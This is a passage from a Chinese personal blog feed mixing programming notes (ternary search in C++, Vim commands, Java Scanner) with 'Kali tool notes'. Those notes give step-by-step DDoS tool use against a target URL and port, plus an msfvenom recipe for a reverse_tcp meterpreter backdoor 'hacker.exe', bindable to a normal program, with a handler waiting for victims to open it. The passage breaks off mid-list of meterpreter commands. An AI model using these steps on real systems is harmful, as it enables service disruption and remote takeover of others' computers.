class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//#define _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-comment">//#include&lt;bits/stdc++.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;functional&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;numeric&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iomanip&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOS ios::sync_with_stdio(0);cin.tie(0),cout.tie(0);</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> INF=<span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> maxn=<span class="hljs-number">1e6</span>+<span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PI acos(-1)</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find3</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a,<span class="hljs-keyword">int</span> l,<span class="hljs-keyword">int</span> r,<span class="hljs-keyword">int</span> key)</span></span>&#123;<br><span class="hljs-keyword">int</span> flag;<br><span class="hljs-keyword">if</span>(l&gt;r) flag=<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">int</span> mid1=(r-l)/<span class="hljs-number">3</span>+l; <span class="hljs-comment">//自行带入数据比较好理解</span><br><span class="hljs-keyword">int</span> mid2=r-(r-l)/<span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span>(key==a[mid1]) flag=mid1;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key==a[mid2]) flag=mid2;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key&lt;a[mid1]) flag=find3(a,l,mid1<span class="hljs-number">-1</span>,key);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key&gt;a[mid2]) flag=find3(a,mid2+<span class="hljs-number">1</span>,r,key);<br><span class="hljs-keyword">else</span> flag=find3(a,mid1+<span class="hljs-number">1</span>,mid2<span class="hljs-number">-1</span>,key);<br>&#125;<br><span class="hljs-keyword">return</span> flag;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> t[<span class="hljs-number">100</span>];<br><span class="hljs-keyword">int</span> n,m;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;请输入总个数和要查找的数：&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;请输入数：&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;++i) <span class="hljs-built_in">cin</span>&gt;&gt;t[i];<br>sort(t+<span class="hljs-number">1</span>,t+n+<span class="hljs-number">1</span>);<br><span class="hljs-keyword">int</span> f=find3(t,<span class="hljs-number">1</span>,n,m);<br><span class="hljs-keyword">if</span>(f==<span class="hljs-number">-1</span>) <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;NO!&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;OK!&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>IOS;<br>solve();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux-Vim的使用操作</title>
    <link href="/2021/04/12/Linux-Vim%E7%9A%84%E4%BD%BF%E7%94%A8%E6%93%8D%E4%BD%9C/"/>
    <url>/2021/04/12/Linux-Vim%E7%9A%84%E4%BD%BF%E7%94%A8%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>Vim 是从 vi 发展出来的一个文本编辑器。其代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。和 Emacs 并列成为类 Unix 系统用户最喜欢的编辑器。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-Vi基础"><a href="#1-Vi基础" class="headerlink" title="1.Vi基础"></a>1.Vi基础</h3><p>基本上 vi 共分为三种模式，分别是“一般指令模式”、“编辑模式”与“命令行命令模式”。 这三种模式的作用分别是：</p><ul><li><p>一般指令模式 （command mode）</p><blockquote><p>以 vi 打开一个文件就直接进入一般指令模式了（这是默认的模式，也简称为一般模式）。在这个模式中， 你可以使用“上下左右”按键来移动光标，你可以使用“删除字符”或“删除整列”来处理文件内容， 也可以使用“复制、贴上”来处理你的文件数据。</p></blockquote></li><li><p>编辑模式 （insert mode）</p><blockquote><p>在一般指令模式中可以进行删除、复制、贴上等等的动作，但是却无法编辑文件内容的！ 要等到你按下“i, I, o, O, a, A, r, R”等任何一个字母之后才会进入编辑模式。注意了！通常在 Linux 中，按下这些按键时，在画面的左下方会出现“ INSERT 或 REPLACE ”的字样，此时才可以进行编辑。而如果要回到一般指令模式时， 则必须要按下“Esc”这个按键即可退出编辑模式。</p></blockquote></li><li><p>命令行命令模式 （command-line mode）</p><blockquote><p>在一般模式当中，输入“ : / ? ”三个中的任何一个按钮，就可以将光标移动到最下面那一列。在这个模式当中， 可以提供你“搜寻数据”的动作，而读取、存盘、大量取代字符、离开 vi 、显示行号等等的动作则是在此模式中达成的！</p></blockquote></li></ul><p><img src="https://img-blog.csdnimg.cn/20210412092335171.gif"></p><p>可以发现一般指令模式可与编辑模式及命令行界面切换， 但编辑模式与命令行界面之间不可互相切换。<br><strong>注意：</strong>英文版的 vi/vim 说明中，一般模式其实是“ command mode ”的意思！中文直译会变成指令模式啊！ 之所以称为指令模式，主因是我们可以在一般模式下面按下很多特殊的指令功能！例如删除、复制、区块选择等等！只是这个模式很容易跟命令行界面 （command-line） 混淆～不过真的很容易误解！所以，在此博客中这一模式改称为“一般指令模式”！</p><h3 id="2-常见操作"><a href="#2-常见操作" class="headerlink" title="2.常见操作"></a>2.常见操作</h3><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">dd</td><td align="center">删除（剪切）光标所在整行</td></tr><tr><td align="center">ndd</td><td align="center">删除（剪切）从光标处开始的5行</td></tr><tr><td align="center">yy</td><td align="center">复制光标所在整行</td></tr><tr><td align="center">nyy</td><td align="center">复制从光标处开始的5行</td></tr><tr><td align="center">n</td><td align="center">显示搜索命令定位到的下一个字符串</td></tr><tr><td align="center">N</td><td align="center">显示搜索命令定位到的上一个字符串</td></tr><tr><td align="center">u</td><td align="center">撤销上一步的操作</td></tr><tr><td align="center">p</td><td align="center">将之前删除（dd）或复制（yy）过的数据粘贴到光标后面</td></tr><tr><td align="center">:w</td><td align="center">保存</td></tr><tr><td align="center">:q</td><td align="center">退出</td></tr><tr><td align="center">:q!</td><td align="center">强制退出（放弃对文档的修改内容）</td></tr><tr><td align="center">:wq!</td><td align="center">强制保存退出</td></tr><tr><td align="center">:set nu</td><td align="center">显示行号</td></tr><tr><td align="center">:set nonu</td><td align="center">不显示行号</td></tr><tr><td align="center">:命令</td><td align="center">执行该命令</td></tr><tr><td align="center">:整数</td><td align="center">跳转到该行</td></tr><tr><td align="center">: s/one/two</td><td align="center">将当前光标所在行的第一个one替换成two</td></tr><tr><td align="center">:s/one/two/g</td><td align="center">将当前光标所在行的所有one替换成two</td></tr><tr><td align="center">:%s/one/two/g</td><td align="center">将全文中的所有one替换成two</td></tr><tr><td align="center">?字符串</td><td align="center">在文本中从下至上搜索该字符串</td></tr><tr><td align="center">/字符串</td><td align="center">在文本中从上至下搜索该字符串</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>博客声明</title>
    <link href="/2021/04/12/%E5%8D%9A%E5%AE%A2%E5%A3%B0%E6%98%8E/"/>
    <url>/2021/04/12/%E5%8D%9A%E5%AE%A2%E5%A3%B0%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<h3 id="本博客网站仅为写者学习记录整理所用，部分博客内容来源于网络。"><a href="#本博客网站仅为写者学习记录整理所用，部分博客内容来源于网络。" class="headerlink" title="本博客网站仅为写者学习记录整理所用，部分博客内容来源于网络。"></a>本博客网站仅为写者学习记录整理所用，部分博客内容来源于网络。</h3>]]></content>
    
    
    <categories>
      
      <category>博客声明</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(五)-Scanner 类</title>
    <link href="/2021/04/11/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%BA%94)-Scanner%20%E7%B1%BB/"/>
    <url>/2021/04/11/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%BA%94)-Scanner%20%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习(五)，与输入有关的Scanner 类。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>java.util.Scanner 是 Java5 的新特征，我们可以通过 Scanner 类来获取用户的输入。</p><blockquote><p>导包：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner; <br></code></pre></div></td></tr></table></figure><blockquote><p>创建Scanner类对象</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Scanner s = <span class="hljs-keyword">new</span> Scanner(System.in);<br></code></pre></div></td></tr></table></figure><p>通过 Scanner 类的 next() 与 nextLine() 方法获取输入的字符串，在读取前我们一般需要 使用 hasNext 与 hasNextLine 判断是否还有输入的数据。</p><h3 id="1-使用next输入"><a href="#1-使用next输入" class="headerlink" title="1.使用next输入"></a>1.使用next输入</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">        Scanner cin = <span class="hljs-keyword">new</span> Scanner(System.in);<br>        <span class="hljs-comment">// next方式接收字符串</span><br>        System.out.println(<span class="hljs-string">&quot;next方式接收：&quot;</span>);<br>        <span class="hljs-comment">// 判断是否还有输入</span><br>        <span class="hljs-keyword">if</span> (cin.hasNext()) &#123;<br>            String str1 = cin.next();<br>            System.out.println(<span class="hljs-string">&quot;输入的数据为：&quot;</span> + str1);<br>        &#125;<br>        cin.close();<br><span class="hljs-comment">//输入</span><br>lichengloong com<br><span class="hljs-comment">//输出</span><br>lichengloong <span class="hljs-comment">//没有后面的com</span><br></code></pre></div></td></tr></table></figure><h3 id="2-使用-nextLine-方法"><a href="#2-使用-nextLine-方法" class="headerlink" title="2.使用 nextLine 方法"></a>2.使用 nextLine 方法</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">        Scanner cin = <span class="hljs-keyword">new</span> Scanner(System.in);<br>        System.out.println(<span class="hljs-string">&quot;nextLine方式接收：&quot;</span>);<br>        <span class="hljs-comment">// 判断是否还有输入</span><br>        <span class="hljs-keyword">if</span> (cin.hasNextLine()) &#123;<br>            String str2 = cin.nextLine();<br>            System.out.println(<span class="hljs-string">&quot;输入的数据为：&quot;</span> + str2);<br>        &#125;<br>        cin.close();<br><span class="hljs-comment">//输入</span><br>lichengloong com<br><span class="hljs-comment">//输出</span><br>lichengloong com<br></code></pre></div></td></tr></table></figure><h3 id="3-next-与-nextLine-区别"><a href="#3-next-与-nextLine-区别" class="headerlink" title="3.next() 与 nextLine() 区别"></a>3.next() 与 nextLine() 区别</h3><p><strong>next()：</strong></p><blockquote><p>1、一定要读取到有效字符后才可以结束输入。<br>2、对输入有效字符之前遇到的空白，next() 方法会自动将其去掉。<br>3、只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符。<br>next() 不能得到带有空格的字符串。</p></blockquote><p><strong>nextLine()：</strong></p><blockquote><p>1、以Enter为结束符,也就是说 nextLine()方法返回的是输入回车之前的所有字符。<br>2、可以获得空白。</p></blockquote><p>如果要输入 int 或 float 类型的数据，在 Scanner 类中也有支持。但是在输入之前最好先使用 hasNextXxx() 方法进行验证，再使用 nextXxx() 来读取。</p><p>输入的时候字符都是可见的，所以Scanner类不适合从控制台读取密码。从Java SE 6开始特别引入了Console类来实现这个目的。具体用法可自行百度。需要注意的是，在Eclipse中用此方法是会报错的。如果直接在集成开发环境下执行代码会报错。如下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Exception in thread <span class="hljs-string">&quot;main&quot;</span> java.lang.NullPointerException<br></code></pre></div></td></tr></table></figure><p>可以直接在命令提示符中采用javac XX.java , java XX的方式运行代码，可获得想要的效果。<br>采用Console对象处理输入不如采用Scanner方便。每次只能读取一行输入，而没有能够读取一个单词或者一个数值的方法。</p><h3 id="4-主动对输入字符串进行分割"><a href="#4-主动对输入字符串进行分割" class="headerlink" title="4.主动对输入字符串进行分割"></a>4.主动对输入字符串进行分割</h3><p>通过StringTokenizer类可以分解输入的整行得到的带空格的字符串。默认情况下，StringTokenizer以空格，制表符，换行符和回车符作为分割依据。StringTokenizer类属于 java.util 包。</p><p><strong>例一</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> java.util.StringTokenizer;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Scanner scanner=<span class="hljs-keyword">new</span> Scanner(System.in);<br>        System.out.println(<span class="hljs-string">&quot;输入数据：&quot;</span>);<br>        StringTokenizer stringTokenizer=<span class="hljs-keyword">new</span> StringTokenizer(scanner.nextLine());<br>        System.out.println(<span class="hljs-string">&quot;分隔后：&quot;</span>);<br>        <span class="hljs-keyword">while</span>(stringTokenizer.hasMoreTokens())&#123; <span class="hljs-comment">//hasMoreTokens()该方法是用来判断是否还有分隔符，返回值是布尔。</span><br>            System.out.println(stringTokenizer.nextToken());<span class="hljs-comment">//nextToken() 用于返回下一个匹配的字段。</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输入</span><br>lichengloong com<br><span class="hljs-comment">//输出</span><br>lichengloong<br>com<br></code></pre></div></td></tr></table></figure><p><strong>例二</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        StringTokenizer st = <span class="hljs-keyword">new</span> StringTokenizer(<span class="hljs-string">&quot;www.lichengloong.com&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-keyword">while</span> (st.hasMoreTokens()) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Token:&quot;</span> + st.nextToken());<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出</span><br>Token:www<br>Token:lichengloong<br>Token:com<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali-Pentmenu</title>
    <link href="/2021/04/11/Kali-Ddos-Pentmenu/"/>
    <url>/2021/04/11/Kali-Ddos-Pentmenu/</url>
    
    <content type="html"><![CDATA[<p>Kali Linux 工具使用笔记。以下均是在Kali Linux 2020版本中实现。</p><h1 id="安装Pentmenu"><a href="#安装Pentmenu" class="headerlink" title="安装Pentmenu"></a>安装Pentmenu</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">git clone https:<span class="hljs-comment">//github.com/GinjaChris/pentmenu       </span><br></code></pre></div></td></tr></table></figure><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span> cd pentmenu   <br><span class="hljs-number">2.</span> ./pentmenu  <br><span class="hljs-number">3.</span> 选用<span class="hljs-number">2</span><br><span class="hljs-number">4.</span>根据情况选择(这里选择<span class="hljs-number">9</span>)<br><span class="hljs-number">5.</span>输入网址或IP<br><span class="hljs-number">6.</span>输入端口(一般<span class="hljs-number">80</span>即可)<br><span class="hljs-number">7.</span>输入发包的数量(默认<span class="hljs-number">2000</span>)<br><br><span class="hljs-number">8.</span>没说的可以直接回车<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali工具使用笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali-Ddos-Attack</title>
    <link href="/2021/04/11/Kali-Ddos-attack/"/>
    <url>/2021/04/11/Kali-Ddos-attack/</url>
    
    <content type="html"><![CDATA[<p>Kali Linux 工具使用笔记。以下均是在Kali Linux 2020版本中实现。</p><h1 id="安装DDOS-Attack"><a href="#安装DDOS-Attack" class="headerlink" title="安装DDOS-Attack"></a>安装DDOS-Attack</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">git clone https:<span class="hljs-comment">//github.com/Ha3MrX/DDos-Attack</span><br></code></pre></div></td></tr></table></figure><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h4 id="在终端输入"><a href="#在终端输入" class="headerlink" title="在终端输入"></a>在终端输入</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>进入DDOS-Attack文件<br>cd DDOS-Attack<br><span class="hljs-number">2.</span>设置权限<br>chmod +x ddos-attack.py<br><span class="hljs-number">3.</span>启用<br>python ddos-attack.py<br><span class="hljs-number">4.</span>在出现的界面内输入网址或IP<br><span class="hljs-number">5.</span>再输入端口号(一般是<span class="hljs-number">80</span>)<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali工具使用笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali-WPScan(WordPress网址攻击)</title>
    <link href="/2021/04/11/Kali-WPScan(WordPress%E7%BD%91%E5%9D%80%E6%94%BB%E5%87%BB)/"/>
    <url>/2021/04/11/Kali-WPScan(WordPress%E7%BD%91%E5%9D%80%E6%94%BB%E5%87%BB)/</url>
    
    <content type="html"><![CDATA[<p>Kali Linux 工具使用笔记。以下均是在Kali Linux 2020版本中实现。</p><h1 id="安装WPScan"><a href="#安装WPScan" class="headerlink" title="安装WPScan"></a>安装WPScan</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">apt-get update<br>apt-get install wpscan<br></code></pre></div></td></tr></table></figure><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali工具使用笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali-MSF入侵</title>
    <link href="/2021/04/11/Kali-MSF%E5%85%A5%E4%BE%B5/"/>
    <url>/2021/04/11/Kali-MSF%E5%85%A5%E4%BE%B5/</url>
    
    <content type="html"><![CDATA[<p>Kali Linux 工具使用笔记。以下均是在Kali Linux 2020版本中实现。</p><h1 id="MSF入侵电脑"><a href="#MSF入侵电脑" class="headerlink" title="MSF入侵电脑"></a>MSF入侵电脑</h1><h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">msfvenom<br>msfconsole<br></code></pre></div></td></tr></table></figure><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span> 生成后门文件 hacker.exe<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=本地IP LPORT=端口  -f exe -o hacker.exe <span class="hljs-comment">//端口8888或4444等,ifconfig查看本地IP</span><br>参数：<br>-p payloads<br>-f 输出格式<br>-o 输入地址<br>-e 编码方式（msfvenom -l -encoder 可以查看能使用的编码）<br>-x | -k 绑定程序 （例如 –x C:\nomal.exe –k –f exe –o C:\shell.exe）<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">2.</span> 给予权限<br>chmod <span class="hljs-number">777</span> hacker.exe<br></code></pre></div></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">3.</span> 执行命令：<br>①运行msfconsole<br>msfconsole<br>②选择模块<br>msf &gt; use exploit/multi/handler<br>③ <span class="hljs-built_in">set</span> lhost 本地IP<br>④ <span class="hljs-built_in">set</span> lport 端口号<br>⑤后台执行<br>msf exploit(handler) &gt; exploit -z -j <br></code></pre></div></td></tr></table></figure><h3 id="这个时候等待目标打开我们的hacker-exe，打开即上钩了"><a href="#这个时候等待目标打开我们的hacker-exe，打开即上钩了" class="headerlink" title="这个时候等待目标打开我们的hacker.exe，打开即上钩了"></a>这个时候等待目标打开我们的hacker.exe，打开即上钩了</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">4.</span>查看上钩的用户<br><span class="hljs-function">msf <span class="hljs-title">exploit</span><span class="hljs-params">(handler)</span> &gt; sessions</span><br>5.选择需要攻击的用户，这里选择第 1 个<br>msf exploit(handler) &gt; sessions -i 1<br><span class="hljs-number">6.</span>执行shell<br><span class="hljs-number">7.</span>meterpreter &gt; shell <br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">file&gt;dir<br></code></pre></div></td></tr></table></figure><h4 id="进入meterpreter之后即可进行一些相关木马操作"><a href="#进入meterpreter之后即可进行一些相关木马操作" class="headerlink" title="进入meterpreter之后即可进行一些相关木马操作"></a>进入meterpreter之后即可进行一些相关木马操作</h4><p>首先可以查看帮助文档，命令“help”，挑常用操作来讲↓↓↓</p><hr><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">用户操作：Stdapi: User interface 